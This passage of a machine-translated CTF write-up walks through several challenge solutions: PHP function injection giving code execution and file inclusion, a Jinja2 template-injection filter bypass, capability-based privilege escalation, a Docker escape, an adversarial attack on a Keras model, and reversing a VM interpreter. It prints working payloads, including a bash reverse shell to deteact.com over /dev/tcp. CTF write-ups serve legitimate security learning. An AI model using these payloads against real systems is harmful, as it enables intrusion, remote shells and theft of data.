fontes.</i>  <i>V√° mais fundo.</i> </li><li>  Inje√ß√£o de Fun√ß√£o (FI) na entrada ' <i>filtro</i> '. </li><li>  A valida√ß√£o do upload de imagens agora est√° clara para n√≥s. </li><li>  A biblioteca ImageMagic √© usada.  Assumir que √© usado para explora√ß√£o √© um beco sem sa√≠da.  N√£o acho que exista nenhuma maneira de explor√°-lo sem depender do FI. </li></ul><br><h4>  Vulnerabilidade: Inje√ß√£o de Fun√ß√£o </h4><br>  O arquivo <b>upload.php</b> possui algum c√≥digo suspeito: <br><br><pre> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br>  Podemos simplific√°-lo para: <br><br><pre> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br>  Voc√™ pode realmente detectar essa vulnerabilidade apenas fazendo algumas perguntas.  Enviar nomes de fun√ß√µes como " <b>var_dump</b> " ou " <b>debug_zval_dump</b> " na entrada ' <i>filter</i> ' resultar√° em respostas interessantes do servidor. <br><br><pre> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br>  Mas n√£o √© o nosso caso.  Existem pelo menos duas maneiras de resolver a tarefa. <br><br><h4>  vetor filter_input_array (solu√ß√£o n√£o intencional): vetor RCE </h4><br>  Enquanto pensava em poss√≠veis maneiras de obter o RCE, notei que a <code>function filter_input_array</code> nos d√° um bom controle sobre a <code>$filterImage variable</code> . <br><br>  Passar a <b>matriz de filtro</b> como segundo argumento permitir√° criar uma matriz arbitr√°ria no resultado da fun√ß√£o. <br><br>  Mas o ImageMagic n√£o espera obter nada al√©m da classe Imagick.  :( <br><br>  Pode ser que possamos desserializar a classe da entrada?  Vamos procurar argumentos de filtro adicionais na <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">descri√ß√£o filter_input_array</a> . <br><br>  N√£o √© mencionado na pr√≥pria p√°gina de fun√ß√£o, mas podemos realmente transmitir um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">retorno de chamada para valida√ß√£o de entrada</a> .  O exemplo FILTER_CALLBACK √© para <code>filter_input</code> , mas tamb√©m funciona para <code>filter_input_array</code> ! <br><br>  Isso significa que podemos "validar" entradas personalizadas do usu√°rio usando a fun√ß√£o com um argumento (eval? System?), E temos controle sobre o argumento. <br><br><pre> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br>  Exemplo para obter o RCE: <br><br><pre> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br>  Resposta: <br><br><pre> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  Linha <b>pesquisada</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br>  Definitivamente, algo estava errado, porque por que precisamos obter o c√≥digo fonte?  S√≥ por uma dica?  Por que os arquivos enviados foram armazenados em disco, n√£o √© mais conveniente n√£o armazenar arquivos indesejados dos usu√°rios desafiadores? <br><br>  Coincid√™ncia na nomea√ß√£o <b>filter</b> = <b>filter</b> _input_array, text [a] [ <b>filter</b> ] me deu confian√ßa de que tudo foi feito conforme o esperado (" <b>filtros</b> nunca antes vistos", marque ‚úì). <br><br><h4>  vetor spl_autoload: vetor LFI </h4><br>  Ap√≥s enviar a solu√ß√£o, fui contatado por um dos autores do desafio, que disse que meu vetor n√£o era destinado e que outra fun√ß√£o pode ser usada ( <code>spl_autoload</code> ): <br><br>  N√£o √© √≥bvio como podemos usar essa fun√ß√£o porque, como √© suposto carregar uma classe "&lt;class_name&gt;" do arquivo denominado "&lt;class_name&gt; &lt;some_extension&gt;".  A assinatura √© a seguinte: <br><br><pre> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br>  Nosso primeiro argumento s√≥ pode ser n√∫mero (1-512), ent√£o o <i>nome</i> da <i>classe</i> √© um ... n√∫mero? ... estranho. <br>  <i>O</i> argumento de <i>extens√£o</i> tamb√©m parece inutiliz√°vel; os arquivos controlados s√£o um n√≠vel mais profundo que o <b>upload.php</b> (precisamos passar um prefixo). <br><br>  Esta fun√ß√£o pode realmente nos fornecer um LFI se usada desta maneira: <br><br><pre> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br>  O nome do diret√≥rio √© adquirido a partir do c√≥digo fonte vazado.  E tivemos sorte, porque se o primeiro caractere do nome fosse algo al√©m do n√∫mero -&gt; n√£o poder√≠amos incluir arquivos a partir da√≠. <br><br>  Ent√£o ... tudo o que precisamos agora √© passar um "tipo de validade" ( <b>getimagesize</b> deve aceit√°-lo) <b>* .jpg</b> com o c√≥digo php emitido.  Exemplo simples (carga √∫til do php em exif) √© anexado. <br><br>  Carregue-o como <i>1111.jpg</i> e fa√ßa: <br><br>  GET: <br>  a = / get_the_flag <br><br>  POST: <br>  filter = spl_autoload <br>  size = 51 <br>  text = a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br>  submit = 1 <br><br>  Resposta: <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  Linha <b>pesquisada</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br>  O upload e o LFI podem ser feitos em uma solicita√ß√£o. <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2><a name="Time"></a>  Dia5.  Tempo </h2><br>  Esta tarefa foi preparada pela <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">equipe de Seguran√ßa Digital</a> <br>  <i>A primeira coisa que voc√™ precisa √© diminuir o tempo, a segunda √© ir al√©m do mundo pequeno.</i>  <i>Depois disso, voc√™ receber√° uma arma contra o n√≠vel final do chefe.</i>  <i>Boa sorte</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>Dicas</b> <br>  <i><b>27/10/2018 16:00</b></i> <i><br></i>  <i>Oh, quantos dispositivos em uma caixa ... eles s√£o realmente √∫teis?</i> <i><br></i>  <i><b>27/10/2018 14:35</b></i> <i><br></i>  <i>Se voc√™ conseguiu lidar com o filtro no painel de tempo, pode usar os recursos de um sistema inteiro.</i>  <i>N√£o seja t√≠mido.</i> <i><br></i>  <i><b>27/10/2018 14:25</b></i> <i><br></i>  <i>Verifique o host virtual e n√£o detenha 200</i> <i><br></i>  <i><b>26/10/2018 19:25</b></i> <i><br></i>  <i>Tarefa n√£o foi resolvida.</i>  <i>24 horas adicionadas.</i> <i><br></i>  <i><b>26/10/2018 17:35</b></i> <i><br></i>  <i>Use todos os seus recursos.</i> <i><br></i>  <i><b>26/10/2018 12:25</b></i> <i><br></i>  <i>Voc√™ n√£o precisa de nenhum software forense para concluir qualquer est√°gio de uma tarefa.</i> <br><br><h4>  1) Wordpress </h4><br>  Inicialmente, recebemos o endere√ßo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">51.15.75.80</a> . <br>  Executamos o hehdirb - vemos o diret√≥rio / wordpress /.  V√° imediatamente para o painel de <i>administra√ß√£o</i> em <i>admin: admin</i> . <br>  No painel do administrador, vemos que n√£o h√° privil√©gios para alterar modelos, portanto voc√™ n√£o pode obter o RCE.  No entanto, h√° uma postagem oculta: <br>  <i>25/09/2018 POR ADMINISTRADOR</i> <i><br></i>  <i>Privado: notas sobre o painel de hor√°rio</i> <i><br></i>  <i>login: cristopher</i> <i><br></i>  <i>senha: L2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>host: timepanel.zn</i> <br><br><h4>  2) SSTI </h4><br>  Obviamente, voc√™ precisa acessar o mesmo servidor especificando o host virtual <b>timepanel.zn.</b> <br>  Iniciamos o hehdirb neste host - vemos o diret√≥rio / adm_auth, seguimos o login e a senha fornecidos acima.  Vemos o formul√°rio no qual voc√™ precisa inserir as datas ("de" e "para") para obter algumas informa√ß√µes.  Ao mesmo tempo, vemos um coment√°rio no c√≥digo HTML da resposta, onde as mesmas datas s√£o refletidas: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  Obviamente, o erro aqui provavelmente deve estar relacionado a essa reflex√£o e √© improv√°vel que seja XSS, ent√£o tente o SSTI: <br><br><pre> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br>  A resposta √©: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  Ao enviar {{self}}, {{'a' * 5}}, percebemos que esse √© o <b>Jinja2</b> , mas os vetores padr√£o n√£o funcionam.  Enviando vetores sem {{colchetes}}, vemos que a resposta n√£o reflete os caracteres "_" e algumas palavras, por exemplo, "classe".  Esse filtro √© facilmente ignorado pelo uso de request.args e pela constru√ß√£o | attr (), al√©m da codifica√ß√£o de alguns bytes com uma sequ√™ncia de escape. <br><br><div class="spoiler">  <b class="spoiler_title">Consulta final para backconnect</b> <div class="spoiler_text"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4>  3) LPE </h4><br>  Ap√≥s receber o RCE, entendemos que voc√™ precisa elevar privil√©gios para fazer o root.  Existem v√°rios caminhos falsos (/ usr / bin / special, /opt/privesc.py e mais alguns) que eu n√£o quero descrever, pois eles levam apenas um tempo.  H√° tamb√©m um binar / usr / bin / zero, que n√£o possui um suid-bit, mas acontece que ele pode ler qualquer arquivo (basta enviar o caminho codificado em hex no stdin). <br><br>  O motivo s√£o os recursos (/ usr / bin / zero = cap_dac_read_search + ep). <br>  Lemos a sombra, definimos o hash a ser escovado, mas enquanto estiver escovado, achamos que precisamos ler o arquivo de outro usu√°rio que est√° no sistema: <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>Eu posso ler algo para voc√™</i> <i><br></i>  <i>su</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4>  4) Fuga do Docker / Forense </h4><br>  Ent√£o, n√≥s temos uma raiz.  Mas este n√£o √© o fim.  <i>Colocamos o apt install extundelete</i> e encontramos v√°rios arquivos mais interessantes no sistema de arquivos relacionados ao pr√≥ximo est√°gio: <br><br>  <i>Para obter um ticket, voc√™ precisa alterar uma imagem para que ela seja identificada como "1".</i>  <i>Voc√™ tem um modelo e uma imagem.</i>  <i>curl -X POST -F image=@ZeroSource.bmp 'http://51.15.100.188 {6491 / prever'.</i> <br><br>  Portanto, agora nos deparamos com a tarefa padr√£o de gerar um exemplo competitivo para o modelo de aprendizado de m√°quina.  No entanto, nesta fase, ainda n√£o consegui obter todos os arquivos necess√°rios.  Foi poss√≠vel fazer isso apenas colocando o agente R-Studio no servidor e combatendo a per√≠cia remota.  Tendo quase retirado o que eu precisava, descobri que, de fato, o cont√™iner do docker est√° sendo executado em um modo que permite montar o disco inteiro <br><br>  Fazemos mount / dev / vda1 / root / kek e obtemos acesso ao sistema de arquivos host e, ao mesmo tempo, acesso root a todo o servidor (j√° que podemos colocar nossa pr√≥pria chave ssh).  Retiramos o KerasModel.h5, ZeroSource.bmp. <br><br><h4>  5) ML Adversarial </h4><br>  Fica imediatamente claro a partir da figura que a rede neural √© treinada no conjunto de dados MNIST.  Quando tentamos enviar uma imagem arbitr√°ria para o servidor, obtemos a resposta de que as imagens diferem demais.  Isso significa que o servidor mede a dist√¢ncia entre os vetores, porque deseja exatamente um exemplo contradit√≥rio, e n√£o apenas uma imagem com a imagem "1". <br><br>  Tentamos o primeiro ataque que recebemos do foolbox - obtemos o vetor de ataque, mas o servidor n√£o o aceita (a dist√¢ncia √© muito grande).  Ent√£o fui para o mundo selvagem, come√ßando a refazer as implementa√ß√µes do One Pixel Attack no MNIST, e nada aconteceu, j√° que este ataque usa o algoritmo de evolu√ß√£o diferencial, n√£o √© gradiente e tenta encontrar o m√≠nimo estoc√°stico, guiado por mudan√ßas no vetor de probabilidade.  Mas o vetor de probabilidades n√£o mudou, uma vez que a rede neural era muito confiante. <br><br>  No final, eu tive que me lembrar da dica que estava no arquivo de texto original no servidor - "(Normilize ^ _ ^)".  Ap√≥s uma normaliza√ß√£o cuidadosa, foi poss√≠vel realizar efetivamente o ataque usando o algoritmo de otimiza√ß√£o L-BFGS, abaixo est√° a explora√ß√£o final: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  Linha <b>pesquisada</b> : <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2><a name="Awesome_Vm"></a>  Dia6.  Awesome vm </h2><br>  Esta tarefa foi preparada pela equipe da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Escola CTF</a> . <br>  <i>Confira um novo servi√ßo de treinamento!</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>No momento, queremos envolv√™-lo em um teste beta de uma nova m√°quina virtual criada especialmente para testar as habilidades de programa√ß√£o de nossos iniciantes.</i>  <i>Adicionamos prote√ß√£o intelectual contra trapa√ßas e agora queremos verificar tudo antes de oferecer o platfotm.</i>  <i>A VM permite que voc√™ execute programas simples ... ou n√£o apenas ?!</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>Dicas</b> <br>  <i><b>27/10/2018 16:20</b></i> <i><br></i>  <i>Talvez voc√™ possa enganar ou ignorar o sistema de IA?</i> <br><br><h4>  Descri√ß√£o: </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br>  O servi√ßo √© um sistema de valida√ß√£o para arquivos com a extens√£o .cmpld aceita pelo interpretador sibVM.  A tarefa que o programa enviado deve resolver: calcule a soma dos n√∫meros listados no arquivo input.txt, um pouco remanescente de uma competi√ß√£o acm.  Al√©m disso, a descri√ß√£o da interface da web indica que os programas enviados ser√£o verificados usando intelig√™ncia artificial. <br><br>  O servi√ßo consiste em dois cont√™ineres do Docker: <b>dock da</b> <b>Web</b> e <b>prod_inter</b> . <br><br>  <b>O web-docker</b> n√£o <b>√©</b> particularmente interessante para an√°lise.  Tudo o que ele faz √© converter o arquivo enviado no cont√™iner prod_inter, dentro do qual acontece o mais interessante.  O snippet de c√≥digo correspondente √© apresentado abaixo: <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br>  No cont√™iner <b>prod_inter</b> , o arquivo enviado √© verificado e executado nos dados de teste.  Para cada envio, um novo diret√≥rio √© criado em / tmp / aleatoriamente, onde o arquivo enviado √© salvo com um nome aleat√≥rio.  O arquivo flag.txt tamb√©m √© colocado no diret√≥rio criado, que provavelmente √© nosso objetivo. <br><br>  A parte divertida come√ßa: se o arquivo tiver mais de 8192 bytes, o arquivo de entrada do programa ser√° verificado usando intelig√™ncia artificial.  A IA √© uma rede neural ultraprecisa pr√©-treinada.  Se o teste foi bem-sucedido (os dados de entrada t√™m mais de 8192 bytes e a rede neural os atribuiu √† primeira classe), o programa √© executado em cinco testes diferentes, e o resultado √© enviado em uma mensagem de resposta e exibido ao usu√°rio. <br><br>  Se o tamanho dos dados de entrada for menor que 8192 bytes ou eles n√£o passaram no teste pela rede neural, antes de testar o programa, verifique a presen√ßa da substring flag.txt nele e as tentativas de abrir um arquivo com o mesmo nome.  O acesso ao arquivo flag.txt √© monitorado executando o programa na caixa de prote√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">secfilter</a> , que √© baseada nas tecnologias <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">SECCOMP</a> e analisando o log de execu√ß√£o.  Abaixo est√° o c√≥digo de servi√ßo correspondente e um exemplo de log ao tentar abrir um arquivo proibido: <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br>  Para resolver essa tarefa, eu gerei um conjunto de programas para o interpretador sibVM que abrem o arquivo flag.txt e exibem o valor num√©rico do i-√©simo byte do arquivo.  Ao mesmo tempo, cada programa passa com sucesso no teste de IA.  A seguir, ser√° apresentada uma an√°lise de superf√≠cie da rede neural e uma descri√ß√£o da opera√ß√£o da m√°quina virtual. <br><br><h4>  An√°lise de redes neurais </h4><br>  O modelo de rede neural treinado est√° contido no arquivo cnn_model.h5.  A seguir, s√£o apresentadas informa√ß√µes gerais sobre a arquitetura de rede. <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br>  N√£o sabemos o que exatamente a rede neural reconhece, portanto, tentaremos fornecer v√°rios dados.  A partir da arquitetura da rede, fica claro que na entrada recebe uma imagem de canal √∫nico do tamanho 100X100.  Para evitar o efeito da escala no resultado, usaremos seq√º√™ncias de 10.000 bytes convertidos em uma imagem usando as fun√ß√µes usadas no servi√ßo.  Abaixo est√£o os resultados da opera√ß√£o de uma rede neural em v√°rios dados: <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br>  Com base nos resultados, pode-se supor que a rede neural receber√° imagens com predomin√¢ncia de cores pretas (zero bytes).  Provavelmente, escrever um programa que leia caracteres de bandeira exigir√° significativamente menos que 1000 bytes significativos (o restante pode ser preenchido com zeros) e, em seguida, o AI aceitar√° o programa enviado. <br><br>  Por conseguinte, para resolver a tarefa, resta escrever o programa desejado. <br><br><h4>  Int√©rprete SibVM </h4><br>  <b>Estrutura do programa</b> <br>  O primeiro passo √© entender a estrutura do arquivo do programa.  Durante o reverso do int√©rprete, verificou-se que o programa deveria come√ßar com um determinado cabe√ßalho com v√°rios campos de servi√ßo, seguidos por um conjunto de entidades com identificadores, entre os quais deveria haver uma entidade principal do tipo Fun√ß√£o. <br><br><div class="spoiler">  <b class="spoiler_title">Verifica√ß√£o do cabe√ßalho do arquivo</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Recuperando Registros</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Processando registros e iniciando a fun√ß√£o principal</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br>  O resultado √© o seguinte formato de arquivo de entrada: <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4>  Tipos de dados </h4><br>  O int√©rprete suporta v√°rios tipos de entidades.  Abaixo est√° uma tabela e seus identificadores, que no futuro ser√£o necess√°rios para criar o programa. <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4>  Construindo um programa para o int√©rprete </h4><br>  Como mencionado acima, o programa deve ter uma entrada principal com o tipo Fun√ß√£o (5).  Tem o seguinte formato: <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br>  N√£o foi dif√≠cil descobrir o principal ciclo de execu√ß√£o do programa. <br><br><div class="spoiler">  <b class="spoiler_title">Ciclo de execu√ß√£o principal</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  A fun√ß√£o <code>decode_opcode</code> recupera informa√ß√µes sobre a pr√≥xima opera√ß√£o do c√≥digo do programa.  Os dois primeiros bytes de cada opera√ß√£o cont√™m o c√≥digo da opera√ß√£o, o n√∫mero de argumentos e seu tipo.  Os pr√≥ximos bytes (dependendo do tipo e n√∫mero de argumentos) ser√£o interpretados como argumentos para a opera√ß√£o. <br><br>  O formato dos dois primeiros bytes da opera√ß√£o: <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br>  Em seguida, revisaremos algumas instru√ß√µes que nos ajudar√£o a extrair a sinaliza√ß√£o do sistema. <br><br><div class="spoiler">  <b class="spoiler_title">Gr√°fico do interpretador de comandos, fun√ß√£o execute_opcode</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul><li>  Opcode 0 - abre o arquivo (o nome do arquivo √© especificado pelo argumento da opera√ß√£o e √© do tipo String) e coloca seu conte√∫do na parte superior da pilha como um objeto do tipo <code>ByteArray</code> . </li><li>  C√≥digo de Op√ß√£o 2 - Exibe o valor armazenado na parte superior da pilha.  Infelizmente, esta opera√ß√£o n√£o exibir√° o valor de um objeto do tipo <code>ByteArray</code> .  Para resolver esse problema, voc√™ pode obter o i-√©simo elemento da matriz e exibi-lo. </li></ul><br><div class="spoiler">  <b class="spoiler_title">Processando opcode 2</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul><li>  Opcode 13 - pegando um elemento de uma matriz pelo √≠ndice.  A matriz e o √≠ndice do elemento s√£o removidos da pilha, o resultado √© empurrado para a pilha.  Assim, para compilar um programa de trabalho, √© necess√°rio colocar o √≠ndice na pilha. </li><li>  Opcode 7 - coloca o argumento da opera√ß√£o na pilha. </li></ul><br>  Como resultado, o programa consiste em apenas 4 opera√ß√µes: <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler">  <b class="spoiler_title">Programa final</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br>  Linha pesquisada: <b>bandeira {76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2><a name="Hiddenresource"></a>  Dia7.  Hiddenresource </h2><br>  Esta tarefa foi preparada pelo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">RuCTF</a> . <br><br>  <i>Dado o servi√ßo <a href="">n24.elf</a> .</i>  <i>Apenas autorize em 95.216.185.52 e obtenha sua bandeira.</i> <br><br>  <b>Dicas</b> <b><br></b>  <b><i>28/10/2018 20:00</i></b> <br>  <i>Tarefa n√£o foi resolvida.</i>  <i>24 horas adicionadas.</i> <br><br>  A pesquisa do servidor para acesso usando protocolos de conex√£o padr√£o mostrou acesso atrav√©s do SSH (porta 22).  O arquivo fornecido √© um execut√°vel ELF (que foi sutilmente sugerido pela extens√£o no nome) para Linux. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br>  O uso do utilit√°rio strings mostrou a 